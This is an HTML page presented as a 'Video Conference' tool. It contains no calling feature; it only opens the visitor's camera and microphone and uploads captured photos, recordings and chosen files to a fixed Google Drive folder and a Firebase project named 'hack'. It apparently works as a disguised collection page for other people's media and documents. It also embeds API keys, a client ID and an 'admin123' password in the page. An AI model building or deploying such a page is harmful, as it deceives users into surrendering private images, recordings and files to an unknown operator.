<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Conference</title>
    <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-database-compat.js"></script>
    <script src="https://apis.google.com/js/api.js"></script>
    <style>
        body { font-family: Arial; margin: 20px; background: #f0f0f0; }
        .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 10px; }
        video { width: 100%; max-height: 400px; border: 2px solid #007bff; border-radius: 10px; }
        button { background: #007bff; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; font-size: 16px; }
        button:hover { background: #0056b3; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        #log { margin-top: 20px; padding: 10px; background: #e9ecef; border-radius: 5px; max-height: 200px; overflow-y: auto; }
        .status { padding: 10px; margin: 10px 0; border-radius: 5px; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎥 Video Conference</h1>
        
        <div id="videoContainer">
            <video id="video" autoplay muted playsinline></video>
            <div style="margin: 10px 0;">
                <button id="photoBtn">📸 Photo</button>
                <button id="recordBtn">▶️ Record</button>
                <button id="stopBtn" disabled>⏹️ Stop</button>
                <button id="uploadBtn">📁 Upload File</button>
            </div>
        </div>

        <div id="log"></div>
        <input type="file" id="fileInput" style="display:none;" accept="image/*,video/*,.pdf,.doc,.docx">
    </div>

    <script>
        // 🔥 REPLACE THESE 5 VALUES WITH YOUR CONFIGS
        const firebaseConfig = {
  apiKey: "AIzaSyB2VzKQeFdMoAC5Y90O4ii4BZVkP3oBr4g",
  authDomain: "hack-ecd8a.firebaseapp.com",
  databaseURL: "https://hack-ecd8a-default-rtdb.firebaseio.com",
  projectId: "hack-ecd8a",
  storageBucket: "hack-ecd8a.firebasestorage.app",
  messagingSenderId: "736008641484",
  appId: "1:736008641484:web:c5f07d36bd14bfce7ddb69",
  measurementId: "G-GPK3FDGSTQ"
};

        const CLIENT_ID = "977279935877-4hnvfso352bgo7ikgluoj39atuqpgvoj.apps.googleusercontent.com";  // YOUR CLIENT ID
        const API_KEY = "AIzaSyBbFFMNACNhIibBbQtVKhVgtQZDO8v5dUg";        // YOUR API KEY
        const FOLDER_ID = "1nv2zmTTb2rjfPRg0YcBO1zvFtrX04gyY";            // YOUR FOLDER ID
        const ADMIN_PASS = "admin123";                                       // Admin password

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const userId = 'user_' + Math.random().toString(36).substr(2, 9);

        let mediaRecorder, stream, recordedChunks = [];
        let gapiLoaded = false, authInstance = null;

        const video = document.getElementById('video');
        const photoBtn = document.getElementById('photoBtn');
        const recordBtn = document.getElementById('recordBtn');
        const stopBtn = document.getElementById('stopBtn');
        const uploadBtn = document.getElementById('uploadBtn');
        const fileInput = document.getElementById('fileInput');
        const log = document.getElementById('log');

        function addLog(message, type = 'info') {
            const div = document.createElement('div');
            div.className = `status ${type}`;
            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            log.appendChild(div);
            log.scrollTop = log.scrollHeight;
        }

        function initGAPI() {
            gapi.load('auth2:client', () => {
                gapi.client.setApiKey(API_KEY);
                gapi.auth2.init({
                    client_id: CLIENT_ID,
                    scope: 'https://www.googleapis.com/auth/drive.file'
                }).then(() => {
                    gapiLoaded = true;
                    addLog('Google Drive API ready');
                    authInstance = gapi.auth2.getAuthInstance();
                });
            });
        }

        async function uploadToDrive(file, filename) {
            if (!gapiLoaded || !authInstance.isSignedIn.get()) {
                await authInstance.signIn();
            }

            const metadata = {
                name: filename,
                parents: [FOLDER_ID]
            };
            const form = new FormData();
            form.append('metadata', new Blob([JSON.stringify(metadata)], {type: 'application/json'}));
            form.append('file', file);

            const response = await fetch('https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart', {
                method: 'POST',
                headers: new Headers({ 'Authorization': 'Bearer ' + authInstance.currentUser.get().getAuthResponse().access_token }),
                body: form
            });
            
            const fileData = await response.json();
            return `https://drive.google.com/file/d/${fileData.id}/view?usp=sharing`;
        }

        async function saveToFirebase(metadata, driveUrl = null) {
            const data = {
                ...metadata,
                driveUrl: driveUrl,
                timestamp: firebase.database.ServerValue.TIMESTAMP,
                userId: userId
            };
            await db.ref('uploads/' + Date.now()).set(data);
            addLog('✅ Saved to Firebase + Drive');
        }

        // Camera Setup
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(s => {
                stream = s;
                video.srcObject = stream;
                addLog('✅ Camera & Mic access granted');
            })
            .catch(e => addLog('❌ Camera access denied: ' + e.message, 'error'));

        // Photo Capture
        photoBtn.onclick = async () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async (blob) => {
                const file = new File([blob], `photo_${Date.now()}.jpg`, {type: 'image/jpeg'});
                const driveUrl = await uploadToDrive(file, file.name);
                await saveToFirebase({
                    type: 'photo',
                    filename: file.name,
                    size: file.size
                }, driveUrl);
            }, 'image/jpeg');
        };

        // Record Video
        recordBtn.onclick = () => {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream);
            
            mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const file = new File([blob], `video_${Date.now()}.webm`, {type: 'video/webm'});
                const driveUrl = await uploadToDrive(file, file.name);
                await saveToFirebase({
                    type: 'video',
                    filename: file.name,
                    size: file.size,
                    duration: recordedChunks.length
                }, driveUrl);
            };
            
            mediaRecorder.start();
            recordBtn.disabled = true;
            stopBtn.disabled = false;
            addLog('🎥 Recording started...');
        };

        stopBtn.onclick = () => {
            mediaRecorder.stop();
            recordBtn.disabled = false;
            stopBtn.disabled = true;
            addLog('⏹️ Recording stopped');
        };

        // File Upload
        uploadBtn.onclick = () => fileInput.click();
        fileInput.onchange = async (e) => {
            const file = e.target.files[0];
            if (file) {
                addLog(`📁 Uploading ${file.name} (${file.size} bytes)`);
                const driveUrl = await uploadToDrive(file, file.name);
                await saveToFirebase({
                    type: 'file',
                    filename: file.name,
                    size: file.size,
                    mimetype: file.type
                }, driveUrl);
            }
        };

        // Auto-init
        window.onload = initGAPI;
    </script>
</body>
</html>
